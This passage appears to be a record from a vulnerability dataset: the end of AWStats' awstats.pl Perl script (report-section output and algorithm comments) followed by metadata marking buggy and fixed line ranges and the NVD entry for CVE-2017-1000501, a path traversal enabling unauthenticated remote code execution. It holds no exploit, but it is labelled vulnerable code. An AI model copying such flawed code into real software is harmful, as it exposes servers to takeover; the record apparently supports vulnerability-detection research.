{\n\t\t\t&HTMLShowOSDetail();\n\t\t}\n\t\tif ( $HTMLOutput{'browserdetail'} ) {\n\t\t\t&HTMLShowBrowserDetail();\n\t\t}\n\t\tif ( $HTMLOutput{'refererse'} ) {\n\t\t\t&HTMLShowReferers($NewLinkTarget);\n\t\t}\n\t\tif ( $HTMLOutput{'refererpages'} ) {\n\t\t\t&HTMLShowRefererPages($NewLinkTarget);\n\t\t}\n\t\tif ( $HTMLOutput{'keyphrases'} ) {\n\t\t\t&HTMLShowKeyPhrases($NewLinkTarget);\n\t\t}\n\t\tif ( $HTMLOutput{'keywords'} ) {\n\t\t\t&HTMLShowKeywords($NewLinkTarget);\n\t\t}\n\t\tif ( $HTMLOutput{'downloads'} ) {\n\t\t\t&HTMLShowDownloads();\n\t\t}\n\t\tforeach my $code ( keys %TrapInfosForHTTPErrorCodes ) {\n\t\t\tif ( $HTMLOutput{\"errors$code\"} ) {\n\t\t\t\t&HTMLShowErrorCodes($code);\n\t\t\t}\n\t\t}\n\n\t\t# BY EXTRA SECTIONS\n\t\t#----------------------------\n\t\tHTMLShowExtraSections();\n\t\t\n\t\tif ( $HTMLOutput{'info'} ) {\n\t\t\t# TODO Not yet available\n\t\t\tprint \"$Center<a name=\\\"info\\\">&nbsp;</a><br />\";\n\t\t\t&html_end(1);\n\t\t}\n\n\t\t# Print any plugins that have individual pages\n\t\t# TODO - change name, graph isn't so descriptive\n\t\tmy $htmloutput = '';\n\t\tforeach my $key ( keys %HTMLOutput ) { $htmloutput = $key; }\n\t\tif ( $htmloutput =~ /^plugin_(\\w+)$/ ) {\n\t\t\tmy $pluginname = $1;\n\t\t\tprint \"$Center<a name=\\\"plugin_$pluginname\\\">&nbsp;</a><br />\";\n\t\t\tmy $function = \"AddHTMLGraph_$pluginname\";\n\t\t\t&$function();\n\t\t\t&html_end(1);\n\t\t}\n\t}\n\n\t# Output main page\n\t#-----------------\n\tif ( $HTMLOutput{'main'} ) {\n\t\t\n\t\t# Calculate averages\n\t\tmy $max_p = 0;\n\t\tmy $max_h = 0;\n\t\tmy $max_k = 0;\n\t\tmy $max_v = 0;\n\t\tmy $average_nb = 0;\n\t\tforeach my $daycursor ($firstdaytocountaverage .. $lastdaytocountaverage )\n\t\t{\n\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\tmy $year  = $1;\n\t\t\tmy $month = $2;\n\t\t\tmy $day   = $3;\n\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\tnext;\n\t\t\t}                 # If not an existing day, go to next\n\t\t\t$average_nb++;    # Increase number of day used to count\n\t\t\t$AverageVisits += ( $DayVisits{$daycursor} || 0 );\n\t\t\t$AveragePages += ( $DayPages{$daycursor}  || 0 );\n\t\t\t$AverageHits += ( $DayHits{$daycursor}   || 0 );\n\t\t\t$AverageBytes += ( $DayBytes{$daycursor}  || 0 );\n\t\t}\n\t\tif ($average_nb) {\n\t\t\t$AverageVisits = $AverageVisits / $average_nb;\n\t\t\t$AveragePages = $AveragePages / $average_nb;\n\t\t\t$AverageHits = $AverageHits / $average_nb;\n\t\t\t$AverageBytes = $AverageBytes / $average_nb;\n\t\t\tif ( $AverageVisits > $max_v ) { $max_v = $AverageVisits; }\n\t\t\t#if ($average_p > $max_p) { $max_p=$average_p; }\n\t\t\tif ( $AverageHits > $max_h ) { $max_h = $AverageHits; }\n\t\t\tif ( $AverageBytes > $max_k ) { $max_k = $AverageBytes; }\n\t\t}\n\t\telse {\n\t\t\t$AverageVisits = \"?\";\n\t\t\t$AveragePages = \"?\";\n\t\t\t$AverageHits = \"?\";\n\t\t\t$AverageBytes = \"?\";\n\t\t}\n\n\t\t# SUMMARY\n\t\t#---------------------------------------------------------------------\n\t\tif ($ShowSummary) {\n\t\t\t&HTMLMainSummary();\n\t\t}\n\n\t\t# BY MONTH\n\t\t#---------------------------------------------------------------------\n\t\tif ($ShowMonthStats) {\n\t\t\t&HTMLMainMonthly();\n\t\t}\n\n\t\tprint \"\\n<a name=\\\"when\\\">&nbsp;</a>\\n\\n\";\n\n\t\t# BY DAY OF MONTH\n\t\t#---------------------------------------------------------------------\n\t\tif ($ShowDaysOfMonthStats) {\n\t\t\t&HTMLMainDaily($firstdaytocountaverage, $lastdaytocountaverage,\n\t\t\t\t\t\t  $firstdaytoshowtime, $lastdaytoshowtime);\n\t\t}\n\n\t\t# BY DAY OF WEEK\n\t\t#-------------------------\n\t\tif ($ShowDaysOfWeekStats) {\n\t\t\t&HTMLMainDaysofWeek($firstdaytocountaverage, $lastdaytocountaverage, $NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY HOUR\n\t\t#----------------------------\n\t\tif ($ShowHoursStats) {\n\t\t\t&HTMLMainHours($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\tprint \"\\n<a name=\\\"who\\\">&nbsp;</a>\\n\\n\";\n\n\t\t# BY COUNTRY/DOMAIN\n\t\t#---------------------------\n\t\tif ($ShowDomainsStats) {\n\t\t\t&HTMLMainCountries($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY HOST/VISITOR\n\t\t#--------------------------\n\t\tif ($ShowHostsStats) {\n\t\t\t&HTMLMainHosts($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY SENDER EMAIL\n\t\t#----------------------------\n\t\tif ($ShowEMailSenders) {\n\t\t\t&HTMLShowEmailSendersChart( $NewLinkParams, $NewLinkTarget );\n\t\t}\n\n\t\t# BY RECEIVER EMAIL\n\t\t#----------------------------\n\t\tif ($ShowEMailReceivers) {\n\t\t\t&HTMLShowEmailReceiversChart( $NewLinkParams, $NewLinkTarget );\n\t\t}\n\n\t\t# BY LOGIN\n\t\t#----------------------------\n\t\tif ($ShowAuthenticatedUsers) {\n\t\t\t&HTMLMainLogins($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY ROBOTS\n\t\t#----------------------------\n\t\tif ($ShowRobotsStats) {\n\t\t\t&HTMLMainRobots($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY WORMS\n\t\t#----------------------------\n\t\tif ($ShowWormsStats) {\n\t\t\t&HTMLMainWorms();\n\t\t}\n\n\t\tprint \"\\n<a name=\\\"how\\\">&nbsp;</a>\\n\\n\";\n\n\t\t# BY SESSION\n\t\t#----------------------------\n\t\tif ($ShowSessionsStats) {\n\t\t\t&HTMLMainSessions();\n\t\t}\n\n\t\t# BY FILE TYPE\n\t\t#-------------------------\n\t\tif ($ShowFileTypesStats) {\n\t\t\t&HTMLMainFileType($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY FILE SIZE\n\t\t#-------------------------\n\t\tif ($ShowFileSizesStats) {\n\t\t\t# TODO\n\t\t}\n\t\t\n\t\t# BY DOWNLOADS\n\t\t#-------------------------\n\t\tif ($ShowDownloadsStats) {\n\t\t\t&HTMLMainDownloads($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY PAGE\n\t\t#-------------------------\n\t\tif ($ShowPagesStats) {\n\t\t\t&HTMLMainPages($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY OS\n\t\t#----------------------------\n\t\tif ($ShowOSStats) {\n\t\t\t&HTMLMainOS($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY BROWSER\n\t\t#----------------------------\n\t\tif ($ShowBrowsersStats) {\n\t\t\t&HTMLMainBrowsers($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY SCREEN SIZE\n\t\t#----------------------------\n\t\tif ($ShowScreenSizeStats) {\n\t\t\t&HTMLMainScreenSize();\n\t\t}\n\n\t\tprint \"\\n<a name=\\\"refering\\\">&nbsp;</a>\\n\\n\";\n\n\t\t# BY REFERENCE\n\t\t#---------------------------\n\t\tif ($ShowOriginStats) {\n\t\t\t&HTMLMainReferrers($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\tprint \"\\n<a name=\\\"keys\\\">&nbsp;</a>\\n\\n\";\n\n\t\t# BY SEARCH KEYWORDS AND/OR KEYPHRASES\n\t\t#-------------------------------------\n\t\tif ($ShowKeyphrasesStats || $ShowKeywordsStats){\n\t\t\t&HTMLMainKeys($NewLinkParams, $NewLinkTarget);\n\t\t}\t\n\n\t\tprint \"\\n<a name=\\\"other\\\">&nbsp;</a>\\n\\n\";\n\n\t\t# BY MISC\n\t\t#----------------------------\n\t\tif ($ShowMiscStats) {\n\t\t\t&HTMLMainMisc();\n\t\t}\n\n\t\t# BY HTTP STATUS\n\t\t#----------------------------\n\t\tif ($ShowHTTPErrorsStats) {\n\t\t\t&HTMLMainHTTPStatus($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY SMTP STATUS\n\t\t#----------------------------\n\t\tif ($ShowSMTPErrorsStats) {\n\t\t\t&HTMLMainSMTPStatus($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY CLUSTER\n\t\t#----------------------------\n\t\tif ($ShowClusterStats) {\n\t\t\t&HTMLMainCluster($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY EXTRA SECTIONS\n\t\t#----------------------------\n\t\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\t\t&HTMLMainExtra($NewLinkParams, $NewLinkTarget, $extranum);\n\t\t}\n\n\t\t# close the HTML page\n\t\t&html_end(1);\n\t}\n}\nelse {\n\tprint \"Jumped lines in file: $lastlinenb\\n\";\n\tif ($lastlinenb) { print \" Found $lastlinenb already parsed records.\\n\"; }\n\tprint \"Parsed lines in file: $NbOfLinesParsed\\n\";\n\tprint \" Found $NbOfLinesDropped dropped records,\\n\";\n\tprint \" Found $NbOfLinesComment comments,\\n\";\n \tprint \" Found $NbOfLinesBlank blank records,\\n\";\n\tprint \" Found $NbOfLinesCorrupted corrupted records,\\n\";\n\tprint \" Found $NbOfOldLines old records,\\n\";\n\tprint \" Found $NbOfNewLines new qualified records.\\n\";\n}\n\n\n#sleep 10;\n\n0;    # Do not remove this line\n\n#-------------------------------------------------------\n# ALGORITHM SUMMARY\n#\n# Read_Config();\n# Check_Config() and Init variables\n# if 'frame not index'\n#\t&Read_Language_Data($Lang);\n#\tif 'frame not mainleft'\n#\t\t&Read_Ref_Data();\n#\t\t&Read_Plugins();\n# html_head\n#\n# If 'migrate'\n#   We create/update tmp file with\n#     &Read_History_With_TmpUpdate(year,month,day,hour,UPDATE,NOPURGE,\"all\");\n#   Rename the tmp file\n#   html_end\n#   Exit\n# End of 'migrate'\n#\n# Get last history file name\n# Get value for $LastLine $LastLineNumber $LastLineOffset $LastLineChecksum with\n#\t&Read_History_With_TmpUpdate(lastyearbeforeupdate,lastmonthbeforeupdate,lastdaybeforeupdate,lasthourbeforeupdate,NOUPDATE,NOPURGE,\"general\");\n#\n# &Init_HashArray()\n#\n# If 'update'\n#   Loop on each new line in log file\n#     lastlineoffset=lastlineoffsetnext; lastlineoffsetnext=file pointer position\n#     If line corrupted, skip --> next on loop\n#\t  Drop wrong virtual host --> next on loop\n#     Drop wrong method/protocol --> next on loop\n#     Check date --> next on loop\n#     If line older than $LastLine, skip --> next on loop\n#     So it's new line\n#     $LastLine = time or record\n#     Skip if url is /robots.txt --> next on loop\n#     Skip line for @SkipHosts --> next on loop\n#     Skip line for @SkipFiles --> next on loop\n#     Skip line for @SkipUserAgent --> next on loop\n#     Skip line for not @OnlyHosts --> next on loop\n#     Skip line for not @OnlyUsers --> next on loop\n#     Skip line for not @OnlyFiles --> next on loop\n#     Skip line for not @OnlyUserAgent --> next on loop\n#     So it's new line approved\n#     If other month/year, create/update tmp file and purge data arrays with\n#       &Read_History_With_TmpUpdate(lastprocessedyear,lastprocessedmonth,lastprocessedday,lastprocessedhour,UPDATE,PURGE,\"all\",lastlinenb,lastlineoffset,CheckSum($_));\n#     Define a clean Url and Query (set urlwithnoquery, tokenquery and standalonequery and $field[$pos_url])\n#     Define PageBool and extension\n#     Analyze: Misc tracker --> complete %misc\n#     Analyze: Hit on favorite icon --> complete %_misc, countedtraffic=1 (not counted anywhere)\n#     If (!countedtraffic) Analyze: Worms --> complete %_worms, countedtraffic=2\n#     If (!countedtraffic) Analyze: Status code --> complete %_error_, %_sider404, %_referrer404 --> countedtraffic=3\n#     If (!countedtraffic) Analyze: Robots known --> complete %_robot, countedtraffic=4\n#     If (!countedtraffic) Analyze: Robots unknown on robots.txt --> complete %_robot, countedtraffic=5\n#     If (!countedtraffic) Analyze: File types - Compression\n#     If (!countedtraffic) Analyze: Date - Hour - Pages - Hits - Kilo\n#     If (!countedtraffic) Analyze: Login\n#     If (!countedtraffic) Do DNS Lookup\n#     If (!countedtraffic) Analyze: Country\n#     If (!countedtraffic) Analyze: Host - Url - Session\n#     If (!countedtraffic) Analyze: Browser - OS\n#     If (!countedtraffic) Analyze: Referer\n#     If (!countedtraffic) Analyze: EMail\n#     Analyze: Cluster\n#     Analyze: Extra (must be after 'Define a clean Url and Query')\n#     If too many records, we flush data arrays with\n#       &Read_History_With_TmpUpdate(lastprocessedyear,lastprocessedmonth,lastprocessedday,lastprocessedhour,UPDATE,PURGE,\"all\",lastlinenb,lastlineoffset,CheckSum($_));\n#   End of loop\n#\n#   Create/update tmp file\n#\t  Seek to lastlineoffset in logfile to read and get last line into $_\n#\t  &Read_History_With_TmpUpdate(lastprocessedyear,lastprocessedmonth,lastprocessedday,lastprocessedhour,UPDATE,PURGE,\"all\",lastlinenb,lastlineoffset,CheckSum($_))\n#   Rename all created tmp files\n# End of 'update'\n#\n# &Init_HashArray()\n#\n# If 'output'\n#   Loop for each month of required year\n#     &Read_History_With_TmpUpdate($YearRequired,$monthloop,'','',NOUPDATE,NOPURGE,'all' or 'general time' if not required month)\n#   End of loop\n#   Show data arrays in HTML page\n#   html_end\n# End of 'output'\n#-------------------------------------------------------\n\n#-------------------------------------------------------\n# DNS CACHE FILE FORMATS SUPPORTED BY AWSTATS\n# Format /etc/hosts     x.y.z.w hostname\n# Format analog         UT/60 x.y.z.w hostname\n#-------------------------------------------------------\n\n#-------------------------------------------------------\n# IP Format (d=decimal on 16 bits, x=hexadecimal on 16 bits)\n#\n# 13.1.68.3\t\t\t\t\t\tIPv4 (d.d.d.d)\n# 0:0:0:0:0:0:13.1.68.3 \t\tIPv6 (x:x:x:x:x:x:d.d.d.d)\n# ::13.1.68.3\n# 0:0:0:0:0:FFFF:13.1.68.3 \t\tIPv6 (x:x:x:x:x:x:d.d.d.d)\n# ::FFFF:13.1.68.3 \t\t\t\tIPv6\n#\n# 1070:0:0:0:0:800:200C:417B \tIPv6\n# 1070:0:0:0:0:800:200C:417B \tIPv6\n# 1070::800:200C:417B \t\t\tIPv6\n#-------------------------------------------------------\n"], "filenames": ["wwwroot/cgi-bin/awstats.pl"], "buggy_code_start_loc": [17148], "buggy_code_end_loc": [17303], "fixing_code_start_loc": [17147], "fixing_code_end_loc": [17308], "type": "CWE-22", "message": "Awstats version 7.6 and earlier is vulnerable to a path traversal flaw in the handling of the \"config\" and \"migrate\" parameters resulting in unauthenticated remote code execution.", "other": {"cve": {"id": "CVE-2017-1000501", "sourceIdentifier": "cve@mitre.org", "published": "2018-01-03T15:29:00.283", "lastModified": "2020-07-27T03:15:11.997", "vulnStatus": "Modified", "descriptions": [{"lang": "en", "value": "Awstats version 7.6 and earlier is vulnerable to a path traversal flaw in the handling of the \"config\" and \"migrate\" parameters resulting in unauthenticated remote code execution."}, {"lang": "es", "value": "Las versiones 7.6 y anteriores de Awstats son vulnerables a un error de salto de directorio en la manipulaci\u00f3n de los par\u00e1metros \"config\" y \"migrate\", lo que resulta en la ejecuci\u00f3n remota de c\u00f3digo sin autenticar."}], "metrics": {"cvssMetricV30": [{"source": "nvd@nist.gov", "type": "Primary", "cvssData": {"version": "3.0", "vectorString": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "attackVector": "NETWORK", "attackComplexity": "LOW", "privilegesRequired": "NONE", "userInteraction": "NONE", "scope": "UNCHANGED", "confidentialityImpact": "HIGH", "integrityImpact": "HIGH", "availabilityImpact": "HIGH", "baseScore": 9.8, "baseSeverity": "CRITICAL"}, "exploitabilityScore": 3.9, "impactScore": 5.9}], "cvssMetricV2": [{"source": "nvd@nist.gov", "type": "Primary", "cvssData": {"version": "2.0", "vectorString": "AV:N/AC:L/Au:N/C:P/I:P/A:P", "accessVector": "NETWORK", "accessComplexity": "LOW", "authentication": "NONE", "confidentialityImpact": "PARTIAL", "integrityImpact": "PARTIAL", "availabilityImpact": "PARTIAL", "baseScore": 7.5}, "baseSeverity": "HIGH", "exploitabilityScore": 10.0, "impactScore": 6.4, "acInsufInfo": false, "obtainAllPrivilege": false, "obtainUserPrivilege": false, "obtainOtherPrivilege": false, "userInteractionRequired": false}]}, "weaknesses": [{"source": "nvd@nist.gov", "type": "Primary", "description": [{"lang": "en", "value": "CWE-22"}]}], "configurations": [{"nodes": [{"operator": "OR", "negate": false, "cpeMatch": [{"vulnerable": true, "criteria": "cpe:2.3:a:awstats:awstats:*:*:*:*:*:*:*:*", "versionEndIncluding": "7.6.0", "matchCriteriaId": "386B814D-4746-43AD-BF60-7D9BC930FBDC"}]}]}, {"nodes": [{"operator": "OR", "negate": false, "cpeMatch": [{"vulnerable": true, "criteria": "cpe:2.3:o:debian:debian_linux:7.0:*:*:*:*:*:*:*", "matchCriteriaId": "16F59A04-14CF-49E2-9973-645477EA09DA"}, {"vulnerable": true, "criteria": "cpe:2.3:o:debian:debian_linux:8.0:*:*:*:*:*:*:*", "matchCriteriaId": "C11E6FB0-C8C0-4527-9AA0-CB9B316F8F43"}, {"vulnerable": true, "criteria": "cpe:2.3:o:debian:debian_linux:9.0:*:*:*:*:*:*:*", "matchCriteriaId": "DEECE5FC-CACF-4496-A3E7-164736409252"}]}]}], "references": [{"url": "http://www.awstats.org/", "source": "cve@mitre.org", "tags": ["Vendor Advisory"]}, {"url": "https://github.com/eldy/awstats/commit/06c0ab29c1e5059d9e0279c6b64d573d619e1651", "source": "cve@mitre.org", "tags": ["Patch", "Third Party Advisory"]}, {"url": "https://github.com/eldy/awstats/commit/cf219843a74c951bf5986f3a7fffa3dcf99c3899", "source": "cve@mitre.org", "tags": ["Patch", "Third Party Advisory"]}, {"url": "https://lists.debian.org/debian-lts-announce/2018/01/msg00012.html", "source": "cve@mitre.org", "tags": ["Mailing List", "Third Party Advisory"]}, {"url": "https://security.gentoo.org/glsa/202007-37", "source": "cve@mitre.org"}, {"url": "https://www.debian.org/security/2018/dsa-4092", "source": "cve@mitre.org", "tags": ["Third Party Advisory"]}]}, "github_commit_url": "https://github.com/eldy/awstats/commit/06c0ab29c1e5059d9e0279c6b64d573d619e1651"}}